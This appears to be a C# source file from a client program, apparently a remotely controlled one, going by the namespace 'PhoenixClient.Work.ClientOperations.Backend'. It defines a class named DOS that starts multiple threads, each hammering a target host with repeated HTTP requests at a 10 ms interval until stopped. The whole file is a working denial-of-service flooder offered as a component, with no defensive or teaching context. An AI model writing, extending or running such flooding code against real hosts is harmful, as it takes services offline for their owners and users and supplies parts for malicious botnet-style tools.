using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PhoenixClient.Work.ClientOperations.Backend
{
    public static class DOS
    {
        public static Stack<Thread> runningThreads = new Stack<Thread>();

        public static bool running = false;

        public static int cooldown = 10;

        public static void startNewThread(String host)
        {
            runningThreads.Push(new Thread(() => { run(host); }));
            runningThreads.Peek().Start();
        }

        private static void run(String host)
        {
            while (running)
            {
                try
                {
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(host);
                    request.KeepAlive = false;
                    request.GetResponse();
                    Thread.Sleep(cooldown);
                }
                catch
                {
                    Thread.Sleep(cooldown);
                }
            }
        }

        public static void forceKill()
        {
            while (runningThreads.Count != 0)
            {
                runningThreads.Pop().Abort();
            }
        }
    }
}
